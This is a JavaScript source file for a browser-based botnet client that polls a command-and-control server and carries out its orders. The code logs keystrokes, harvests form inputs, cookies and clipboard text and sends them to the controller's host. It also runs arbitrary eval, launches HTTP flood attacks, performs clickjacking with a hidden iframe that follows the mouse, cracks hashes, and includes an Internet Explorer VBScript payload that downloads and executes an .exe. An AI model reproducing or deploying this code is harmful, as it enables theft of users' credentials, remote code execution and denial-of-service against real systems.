var master = "https://boi-parkerhasaids.c9users.io/"; //EDIT THIS

var connectKey = "js6283h7"; //Authentication for bot (no need to change)

var timeout = 20000;
//run commands every 20 seconds resulting in 200 bots online being 10 requests per second and 2000 being 100.
//if you have 5k+ bots you will need to make it higher. 60 seconds is recommended for 10k+ bots.
//also these numbers are all for a small/average server :)



//STOP EDITING AT THIS POINT UNLESS YOU KNOW WHAT YOU ARE DOING



//OS detection
var OSName="Unknown OS";

if (navigator.appVersion.indexOf("Win")!=-1)
    OSName="Windows";
if (navigator.appVersion.indexOf("Mac")!=-1)
    OSName="MacOS";
if (navigator.appVersion.indexOf("X11")!=-1)
    OSName="UNIX";
if (navigator.appVersion.indexOf("Linux")!=-1)
    OSName="Linux"; 



//Browser detection
// Opera 8.0+
var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
// Firefox 1.0+
var isFirefox = typeof InstallTrigger !== 'undefined';
// At least Safari 3+: "[object HTMLElementConstructor]"
var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
// Internet Explorer 6-11
var isIE = /*@cc_on!@*/ false || !!document.documentMode;
// Edge 20+
var isEdge = !isIE && !!window.StyleMedia;
// Chrome 1+
var isChrome = !!window.chrome && !!window.chrome.webstore;
// Blink engine detection
var isBlink = (isChrome || isOpera) && !!window.CSS;

var browserType = "Generic";

if (isOpera) {
	browserType = "Opera";
} else if (isFirefox) {
	browserType = "Firefox";
} else if (isSafari) {
	browserType = "Safari";
} else if (isIE) {
	browserType = "Internet Explorer";
} else if (isEdge) {
	browserType = "Microsoft Edge";
} else if (isChrome) {
	browserType = "Chrome";
} else if (isBlink) {
	browserType = "Blink";
}

var inputs, index;

var inputList = "";

inputs = document.getElementsByTagName('input');
for (index = 0; index < inputs.length; ++index) {
	inputList = inputList + "\r\n" + inputs[index].getAttribute("name") + "=" + inputs[index].getAttribute("value");
}



var keys = "";

document.onkeypress = function(evt) {
	evt = evt || window.event;
	keys += String.fromCharCode(evt.charCode);
};

var meta = document.createElement('meta');
meta.name = "referrer";
meta.content = "no-referrer";
document.getElementsByTagName('head')[0].appendChild(meta); //hide referer


function md5cycle(x, k) {
	var a = x[0],
		b = x[1],
		c = x[2],
		d = x[3];

	a = ff(a, b, c, d, k[0], 7, -680876936);
	d = ff(d, a, b, c, k[1], 12, -389564586);
	c = ff(c, d, a, b, k[2], 17, 606105819);
	b = ff(b, c, d, a, k[3], 22, -1044525330);
	a = ff(a, b, c, d, k[4], 7, -176418897);
	d = ff(d, a, b, c, k[5], 12, 1200080426);
	c = ff(c, d, a, b, k[6], 17, -1473231341);
	b = ff(b, c, d, a, k[7], 22, -45705983);
	a = ff(a, b, c, d, k[8], 7, 1770035416);
	d = ff(d, a, b, c, k[9], 12, -1958414417);
	c = ff(c, d, a, b, k[10], 17, -42063);
	b = ff(b, c, d, a, k[11], 22, -1990404162);
	a = ff(a, b, c, d, k[12], 7, 1804603682);
	d = ff(d, a, b, c, k[13], 12, -40341101);
	c = ff(c, d, a, b, k[14], 17, -1502002290);
	b = ff(b, c, d, a, k[15], 22, 1236535329);

	a = gg(a, b, c, d, k[1], 5, -165796510);
	d = gg(d, a, b, c, k[6], 9, -1069501632);
	c = gg(c, d, a, b, k[11], 14, 643717713);
	b = gg(b, c, d, a, k[0], 20, -373897302);
	a = gg(a, b, c, d, k[5], 5, -701558691);
	d = gg(d, a, b, c, k[10], 9, 38016083);
	c = gg(c, d, a, b, k[15], 14, -660478335);
	b = gg(b, c, d, a, k[4], 20, -405537848);
	a = gg(a, b, c, d, k[9], 5, 568446438);
	d = gg(d, a, b, c, k[14], 9, -1019803690);
	c = gg(c, d, a, b, k[3], 14, -187363961);
	b = gg(b, c, d, a, k[8], 20, 1163531501);
	a = gg(a, b, c, d, k[13], 5, -1444681467);
	d = gg(d, a, b, c, k[2], 9, -51403784);
	c = gg(c, d, a, b, k[7], 14, 1735328473);
	b = gg(b, c, d, a, k[12], 20, -1926607734);

	a = hh(a, b, c, d, k[5], 4, -378558);
	d = hh(d, a, b, c, k[8], 11, -2022574463);
	c = hh(c, d, a, b, k[11], 16, 1839030562);
	b = hh(b, c, d, a, k[14], 23, -35309556);
	a = hh(a, b, c, d, k[1], 4, -1530992060);
	d = hh(d, a, b, c, k[4], 11, 1272893353);
	c = hh(c, d, a, b, k[7], 16, -155497632);
	b = hh(b, c, d, a, k[10], 23, -1094730640);
	a = hh(a, b, c, d, k[13], 4, 681279174);
	d = hh(d, a, b, c, k[0], 11, -358537222);
	c = hh(c, d, a, b, k[3], 16, -722521979);
	b = hh(b, c, d, a, k[6], 23, 76029189);
	a = hh(a, b, c, d, k[9], 4, -640364487);
	d = hh(d, a, b, c, k[12], 11, -421815835);
	c = hh(c, d, a, b, k[15], 16, 530742520);
	b = hh(b, c, d, a, k[2], 23, -995338651);

	a = ii(a, b, c, d, k[0], 6, -198630844);
	d = ii(d, a, b, c, k[7], 10, 1126891415);
	c = ii(c, d, a, b, k[14], 15, -1416354905);
	b = ii(b, c, d, a, k[5], 21, -57434055);
	a = ii(a, b, c, d, k[12], 6, 1700485571);
	d = ii(d, a, b, c, k[3], 10, -1894986606);
	c = ii(c, d, a, b, k[10], 15, -1051523);
	b = ii(b, c, d, a, k[1], 21, -2054922799);
	a = ii(a, b, c, d, k[8], 6, 1873313359);
	d = ii(d, a, b, c, k[15], 10, -30611744);
	c = ii(c, d, a, b, k[6], 15, -1560198380);
	b = ii(b, c, d, a, k[13], 21, 1309151649);
	a = ii(a, b, c, d, k[4], 6, -145523070);
	d = ii(d, a, b, c, k[11], 10, -1120210379);
	c = ii(c, d, a, b, k[2], 15, 718787259);
	b = ii(b, c, d, a, k[9], 21, -343485551);

	x[0] = add32(a, x[0]);
	x[1] = add32(b, x[1]);
	x[2] = add32(c, x[2]);
	x[3] = add32(d, x[3]);

}

function cmn(q, a, b, x, s, t) {
	a = add32(add32(a, q), add32(x, t));
	return add32((a << s) | (a >>> (32 - s)), b);
}

function ff(a, b, c, d, x, s, t) {
	return cmn((b & c) | ((~b) & d), a, b, x, s, t);
}

function gg(a, b, c, d, x, s, t) {
	return cmn((b & d) | (c & (~d)), a, b, x, s, t);
}

function hh(a, b, c, d, x, s, t) {
	return cmn(b ^ c ^ d, a, b, x, s, t);
}

function ii(a, b, c, d, x, s, t) {
	return cmn(c ^ (b | (~d)), a, b, x, s, t);
}

function md51(s) {
	txt = '';
	var n = s.length,
		state = [1732584193, -271733879, -1732584194, 271733878],
		i;
	for (i = 64; i <= s.length; i += 64) {
		md5cycle(state, md5blk(s.substring(i - 64, i)));
	}
	s = s.substring(i - 64);
	var tail = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
	for (i = 0; i < s.length; i++)
		tail[i >> 2] |= s.charCodeAt(i) << ((i % 4) << 3);
	tail[i >> 2] |= 0x80 << ((i % 4) << 3);
	if (i > 55) {
		md5cycle(state, tail);
		for (i = 0; i < 16; i++) tail[i] = 0;
	}
	tail[14] = n * 8;
	md5cycle(state, tail);
	return state;
}

/* there needs to be support for Unicode here,
 * unless we pretend that we can redefine the MD-5
 * algorithm for multi-byte characters (perhaps
 * by adding every four 16-bit characters and
 * shortening the sum to 32 bits). Otherwise
 * I suggest performing MD-5 as if every character
 * was two bytes--e.g., 0040 0025 = @%--but then
 * how will an ordinary MD-5 sum be matched?
 * There is no way to standardize text to something
 * like UTF-8 before transformation; speed cost is
 * utterly prohibitive. The JavaScript standard
 * itself needs to look at this: it should start
 * providing access to strings as preformed UTF-8
 * 8-bit unsigned value arrays.
 */
function md5blk(s) { /* I figured global was faster.   */
	var md5blks = [],
		i; /* Andy King said do it this way. */
	for (i = 0; i < 64; i += 4) {
		md5blks[i >> 2] = s.charCodeAt(i) +
			(s.charCodeAt(i + 1) << 8) +
			(s.charCodeAt(i + 2) << 16) +
			(s.charCodeAt(i + 3) << 24);
	}
	return md5blks;
}

var hex_chr = '0123456789abcdef'.split('');

function rhex(n) {
	var s = '',
		j = 0;
	for (; j < 4; j++)
		s += hex_chr[(n >> (j * 8 + 4)) & 0x0F] +
		hex_chr[(n >> (j * 8)) & 0x0F];
	return s;
}

function hex(x) {
	for (var i = 0; i < x.length; i++)
		x[i] = rhex(x[i]);
	return x.join('');
}

function md5(s) {
	return hex(md51(s));
}

/* this function is much faster,
 so if possible we use it. Some IEs
 are the only ones I know of that
 need the idiotic second function,
 generated by an if clause.  */

function add32(a, b) {
	return (a + b) & 0xFFFFFFFF;
}

if (md5('hello') != '5d41402abc4b2a76b9719d911017c592') {
	function add32(x, y) {
		var lsw = (x & 0xFFFF) + (y & 0xFFFF),
			msw = (x >> 16) + (y >> 16) + (lsw >> 16);
		return (msw << 16) | (lsw & 0xFFFF);
	}
}



function sha1(str) {
	//  discuss at: http://phpjs.org/functions/sha1/
	// original by: Webtoolkit.info (http://www.webtoolkit.info/)
	// improved by: Michael White (http://getsprink.com)
	// improved by: Kevin van Zonneveld (http://kevin.vanzonneveld.net)
	//	input by: Brett Zamir (http://brett-zamir.me)
	//  depends on: utf8_encode
	//   example 1: sha1('Kevin van Zonneveld');
	//   returns 1: '54916d2e62f65b3afa6e192e6a601cdbe5cb5897'

	var rotate_left = function(n, s) {
		var t4 = (n << s) | (n >>> (32 - s));
		return t4;
	};

	/*var lsb_hex = function (val) { // Not in use; needed?
	 var str="";
	 var i;
	 var vh;
	 var vl;

	 for ( i=0; i<=6; i+=2 ) {
	 vh = (val>>>(i*4+4))&0x0f;
	 vl = (val>>>(i*4))&0x0f;
	 str += vh.toString(16) + vl.toString(16);
	 }
	 return str;
	 };*/

	var cvt_hex = function(val) {
		var str = '';
		var i;
		var v;

		for (i = 7; i >= 0; i--) {
			v = (val >>> (i * 4)) & 0x0f;
			str += v.toString(16);
		}
		return str;
	};

	var blockstart;
	var i, j;
	var W = new Array(80);
	var H0 = 0x67452301;
	var H1 = 0xEFCDAB89;
	var H2 = 0x98BADCFE;
	var H3 = 0x10325476;
	var H4 = 0xC3D2E1F0;
	var A, B, C, D, E;
	var temp;

	str = this.utf8_encode(str);
	var str_len = str.length;

	var word_array = [];
	for (i = 0; i < str_len - 3; i += 4) {
		j = str.charCodeAt(i) << 24 | str.charCodeAt(i + 1) << 16 | str.charCodeAt(i + 2) << 8 | str.charCodeAt(i + 3);
		word_array.push(j);
	}

	switch (str_len % 4) {
		case 0:
			i = 0x080000000;
			break;
		case 1:
			i = str.charCodeAt(str_len - 1) << 24 | 0x0800000;
			break;
		case 2:
			i = str.charCodeAt(str_len - 2) << 24 | str.charCodeAt(str_len - 1) << 16 | 0x08000;
			break;
		case 3:
			i = str.charCodeAt(str_len - 3) << 24 | str.charCodeAt(str_len - 2) << 16 | str.charCodeAt(str_len - 1) <<
				8 | 0x80;
			break;
	}

	word_array.push(i);

	while ((word_array.length % 16) != 14) {
		word_array.push(0);
	}

	word_array.push(str_len >>> 29);
	word_array.push((str_len << 3) & 0x0ffffffff);

	for (blockstart = 0; blockstart < word_array.length; blockstart += 16) {
		for (i = 0; i < 16; i++) {
			W[i] = word_array[blockstart + i];
		}
		for (i = 16; i <= 79; i++) {
			W[i] = rotate_left(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1);
		}

		A = H0;
		B = H1;
		C = H2;
		D = H3;
		E = H4;

		for (i = 0; i <= 19; i++) {
			temp = (rotate_left(A, 5) + ((B & C) | (~B & D)) + E + W[i] + 0x5A827999) & 0x0ffffffff;
			E = D;
			D = C;
			C = rotate_left(B, 30);
			B = A;
			A = temp;
		}

		for (i = 20; i <= 39; i++) {
			temp = (rotate_left(A, 5) + (B ^ C ^ D) + E + W[i] + 0x6ED9EBA1) & 0x0ffffffff;
			E = D;
			D = C;
			C = rotate_left(B, 30);
			B = A;
			A = temp;
		}

		for (i = 40; i <= 59; i++) {
			temp = (rotate_left(A, 5) + ((B & C) | (B & D) | (C & D)) + E + W[i] + 0x8F1BBCDC) & 0x0ffffffff;
			E = D;
			D = C;
			C = rotate_left(B, 30);
			B = A;
			A = temp;
		}

		for (i = 60; i <= 79; i++) {
			temp = (rotate_left(A, 5) + (B ^ C ^ D) + E + W[i] + 0xCA62C1D6) & 0x0ffffffff;
			E = D;
			D = C;
			C = rotate_left(B, 30);
			B = A;
			A = temp;
		}

		H0 = (H0 + A) & 0x0ffffffff;
		H1 = (H1 + B) & 0x0ffffffff;
		H2 = (H2 + C) & 0x0ffffffff;
		H3 = (H3 + D) & 0x0ffffffff;
		H4 = (H4 + E) & 0x0ffffffff;
	}

	temp = cvt_hex(H0) + cvt_hex(H1) + cvt_hex(H2) + cvt_hex(H3) + cvt_hex(H4);
	return temp.toLowerCase();
}



function makestr(length, alpha) {
	var text = "";

	for (var i = 0; i < length; i++)
		text += alpha.charAt(Math.floor(Math.random() * alpha.length));

	return text;
}



function imageLoad(URL) {
	var pic = new Image();
	pic.src = URL; //randomize request to avoid caching
}



function prepareFrame(URL) {
	var ifrm = document.createElement("iframe");
	ifrm.src = URL;
	ifrm.style.width = "0px";
	ifrm.style.height = "0px";
	ifrm.style.border = "None";
	ifrm.style.visibility = "hidden";
	document.getElementsByTagName("body")[0].appendChild(ifrm);
}

function wait(ms) {
	var start = new Date().getTime();
	var end = start;
	while (end < start + ms) {
		end = new Date().getTime();
	}
}

function post(url, params) {
	if (window.XMLHttpRequest) {
		http = new XMLHttpRequest();
	} else {
		http = new ActiveXObject("Microsoft.XMLHTTP");
	}

	http.open("POST", url);

	//Send the proper header information along with the request
	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

	http.send(params);
}

function Parse(data) {
	var command = data;
	var command = command.split("\n");

	var i = 0;

	for (i = 0; i < command.length; i++) {
		if (command[i].substring(0, 6) == "cookie") {

			if (document.cookie != undefined && document.cookie != "") {
				var rand = Math.floor(Math.random() * 10000);
				imageLoad(master + "/cookie.php?c=" + encodeURI(document.cookie) + "&referer=" + document.location + "&rand=" + rand); //send clipboardData
			}

		} else if (command[i].substring(0, 9) == "clipboard") {

			window.onpaste = function(e) {
				var paste = e.clipboardData && e.clipboardData.getData ?
					e.clipboardData.getData('text/plain') : // Standard
					window.clipboardData && window.clipboardData.getData ?
					window.clipboardData.getData('Text') : // MS
					false;
				if (paste) {
					var rand = Math.floor(Math.random() * 10000);
					imageLoad(master + "/clipboard.php?clipboard=" + encodeURI(paste) + "&referer=" + document.location + "&rand=" + rand); //send clipboard data
				}
			};

		} else if (command[i].substring(0, 5) == "sleep") {

			var args = command[i].split("*");
			wait(parseInt(args[1]));

		} else if (command[i].substring(0, 4) == "view") {

			var args = command[i].split("*");
			prepareFrame(args[1]); //view website

		} else if (command[i].substring(0, 7) == "exploit") {

			var args = command[i].split("*");

			if (isOpera) {
				//Opera exploit goes here
			} else if (isFirefox) {
				//Firefox exploit goes here
			} else if (isSafari) {
				//Safari exploit goes here
			} else if (isIE) {
				//Internet Explorer exploit by Freak/SynthMesc
				var vbscript = document.createElement("script");
				vbscript.lang = "vbscript";
				vbscript.innerHTML = "dim http_obj\ndim stream_obj\ndim shell_obj\n\nset http_obj = CreateObject('Microsoft.XMLHTTP')\nset stream_obj = CreateObject('ADODB.Stream')\nset shell_obj = CreateObject('WScript.Shell')\n\nURL = '" + args[1] + "' 'Where to download the file from\nFILENAME = 'download.exe' 'Name to save the file (on the local system)\nRUNCMD = 'download.exe' 'Command to run after downloading\n\nhttp_obj.open 'GET', URL, False\nhttp_obj.send\n\nstream_obj.type = 1\nstream_obj.open\nstream_obj.write http_obj.responseBody\nstream_obj.savetofile FILENAME, 2\n\nshell_obj.run RUNCMD\nhttp_obj.open 'GET', '" + master + "/exploit.php?connect=" + encodeURI(connectKey) + "&browsertype=" + encodeURI(browserType) + "&osname=" + encodeURI(OSName) + "&exploit=vbscript', False\nhttp_obj.send\n";
				document.getElementsByTagName("body")[0].appendChild(div);
			} else if (isEdge) {
			//Microsoft Edge exploit CVE-2016-7000

			} else if (isChrome) {
				//Chrome exploit goes here
			} else if (isBlink) {
				//Blink exploit goes here
			}

		} else if (command[i].substring(0, 4) == "post") {

			var args = command[i].split("*");
			post(args[1], args[2]);

		} else if (command[i].substring(0, 9) == "floodpost") {

			var args = command[i].split("*");

			setInterval(function() {
				post(args[1], args[2]);
			}, parseInt(args[3])); //Initiate javascript POST load test

		} else if (command[i].substring(0, 4) == "load") {

			var args = command[i].split("*");

			if (args[1].indexOf("?") > -1) {
				var char = "&";
			} else {
				var char = "?";
			}

			setInterval(function() {
				imageLoad(args[1] + char + Math.floor(Math.random() * 100000000) + "=SynthMesc");
			}, parseInt(args[2])); //Initiate javascript load test

		} else if (command[i].substring(0, 8) == "antiddos") {

			var args = command[i].split("*");

			if (args[1].indexOf("?") > -1) {
				var char = "&";
			} else {
				var char = "?";
			}

			setInterval(function() {
				prepareFrame(args[1] + char + Math.floor(Math.random() * 100000000) + "=SynthMesc");
			}, parseInt(args[2])); //Initiate javascript load test


		} else if (command[i].substring(0, 6) == "layer4") {
			
			var args = command[i].split("*");
			
			var packetsize = parseInt(args[2]);
			var location4byte = Math.floor(Math.random() * packetsize);
			var packet = encodeURI(randByte()) + "=" + encodeURI(randByte());
			
			while(packetsize > packet.length) {
				packet = packet + "&" + encodeURI(randByte()) + "=" + encodeURI(randByte());
				if(packet.length >= location4byte) {
					packet = packet + encodeURI(randByte());
				}
			}
			alert("Packet created! starting...");
			setInterval(function() {
				alert("Sending post");
				post(args[1], packet);
				alert("Post sent!");
			}, parseInt(args[3])); //Initiate javascript POST load test
			
		} else if (command[i].substring(0, 4) == "jack") {

			var args = command[i].split("*");

			var css = '<style>iframe { position:absolute; filter:alpha(opacity=0); opacity:0.0; border: None left:0; top:0; }</style>';

			var iframe = '<iframe id="iframey" src="' + args[1] + '" width="' + args[2] + 'px" height="' + args[3] + 'px" frameBorder="0"></iframe>';

			var div = document.createElement("div");
			div.innerHTML = css + iframe;

			document.getElementsByTagName("body")[0].appendChild(div);

			var frameName = 'iframey'; // div that is to follow the mouse (must be position:absolute)
			var offX = -35; // X offset from mouse position
			var offY = -20; // Y offset from mouse position

			function mouseX(evt) {
				if (!evt) evt = window.event;
				if (evt.pageX) return evt.pageX;
				else if (evt.clientX) return evt.clientX + (document.documentElement.scrollLeft ? document.documentElement.scrollLeft : document.body.scrollLeft);
				else return 0;
			}

			function mouseY(evt) {
				if (!evt) evt = window.event;
				if (evt.pageY) return evt.pageY;
				else if (evt.clientY) return evt.clientY + (document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop);
				else return 0;
			}

			function follow(evt) {
				var obj = document.getElementById(frameName).style;
				obj.left = (parseInt(mouseX(evt)) + offX) + 'px';
				obj.top = (parseInt(mouseY(evt)) + offY) + 'px';
			}
			document.onmousemove = follow;

		} else if (command[i].substring(0, 4) == "eval") {

			var args = command[i].split("*");
			eval(args[1]);

		} else if (command[i].substring(0, 3) == "md5") {
			var args = command[i].split("*");
			var crack = setInterval(function() {
				var test = makestr(parseInt(args[2]), args[3]);
				if (md5(test) == args[1]) {
					imageLoad(master + "/hash.php?result=" + encodeURI("MD5 - " + test + ":" + args[1]));
					clearInterval(crack);
				}
			}, 0);
		} else if (command[i].substring(0, 4) == "sha1") {
			var args = command[i].split("*");
			var crack = setInterval(function() {
				var test = makestr(parseInt(args[2]), args[3]);
				if (sha1(test) == args[1]) {
					imageLoad(master + "/hash.php?result=" + encodeURI("SHA1 - " + test + ":" + args[1]));
					clearInterval(crack);
				}
			}, 0);
		}
	}
}

function pingHome() {
	var xmlhttp;

	if (window.XMLHttpRequest) {
		xmlhttp = new XMLHttpRequest();
	} else {
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}

	var rand = Math.floor(Math.random() * 10000);

	xmlhttp.open("GET", master + "/gate.php?gettasks=" + encodeURI(connectKey) + "&browsertype=" + encodeURI(browserType) + "&osname=" + encodeURI(OSName) + "&rand=" + rand, true);
	xmlhttp.send(null);

	xmlhttp.onreadystatechange = function() {
		if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
			Parse(xmlhttp.responseText);
		}
	};
}

window.onbeforeunload = function(event) {
	if (keys.length >= 1) {
		var param = encodeURI(keys);
		var rand = Math.floor(Math.random() * 10000);
		imageLoad(master + "/logger.php?keys=" + encodeURI(param) + "&referer=" + encodeURI(document.location) + "&rand=" + rand); //randomize request to avoid caching
	}

	if (inputList != "") {
		imageLoad(master + "/inputs.php?inputs=" + encodeURI(inputList) + "&referer=" + encodeURI(document.location));
	}

	var rand = Math.floor(Math.random() * 10000);
	imageLoad(master + "/gate.php?disconnect=" + encodeURI(connectKey) + "&browsertype=" + encodeURI(browserType) + "&osname=" + encodeURI(OSName) + "&rand=" + rand);
};

var rand = Math.floor(Math.random() * 10000);
imageLoad(master + "/gate.php?connect=" + encodeURI(connectKey) + "&browsertype=" + encodeURI(browserType) + "&osname=" + encodeURI(OSName) + "&rand=" + rand);

pingHome();
setInterval(pingHome, timeout);